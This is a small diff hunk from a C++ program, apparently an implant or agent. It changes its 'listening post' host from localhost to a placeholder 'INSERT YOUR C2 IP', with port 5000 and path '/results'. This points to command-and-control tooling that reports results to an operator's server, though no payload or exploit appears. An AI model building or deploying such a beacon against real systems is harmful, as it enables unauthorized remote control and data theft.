@@ -5,7 +5,7 @@
 int main()
 {
     //Specify listening post endpoint configuration
-    const auto host = "localhost";
+    const auto host = "INSERT YOUR C2 IP";
     const auto port = "5000";
     const auto uri = "/results";
 
